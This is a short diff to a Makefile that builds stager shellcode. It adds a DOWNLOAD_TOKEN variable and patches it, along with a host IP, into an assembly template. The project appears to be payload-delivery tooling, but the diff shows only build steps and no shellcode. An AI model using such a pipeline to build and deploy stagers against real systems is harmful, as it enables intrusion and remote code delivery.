@@ -8,7 +8,8 @@
 #   make HOST_IP=<ip>    Build stager shellcode
 #   make clean           Remove all generated files
 
-HOST_IP  ?= 192.168.1.100
+HOST_IP        ?= 192.168.1.100
+DOWNLOAD_TOKEN ?= PLACEHOLDER_TOKEN
 
 SRC_DIR  = src
 BIN_DIR  = bin
@@ -36,10 +37,10 @@ $(BIN_DIR):
 
 # ── Stager shellcode ──────────────────────────────────────────────────────────
 
-# Substitute HOST_IP into the asm template
+# Substitute HOST_IP and DOWNLOAD_TOKEN into the asm template
 $(STAGER_PATCHED): $(STAGER_SRC) | $(BIN_DIR)
-	@echo "[1/2] Patching HOST_IP=$(HOST_IP) into stager.asm"
-	sed 's/HOST_IP/$(HOST_IP)/g' $< > $@
+	@echo "[1/2] Patching HOST_IP=$(HOST_IP) and DOWNLOAD_TOKEN into stager.asm"
+	sed 's/HOST_IP/$(HOST_IP)/g; s/DOWNLOAD_TOKEN/$(DOWNLOAD_TOKEN)/g' $< > $@
 
 # Assemble to flat binary
 $(FINAL_BIN): $(STAGER_PATCHED) | $(BIN_DIR)
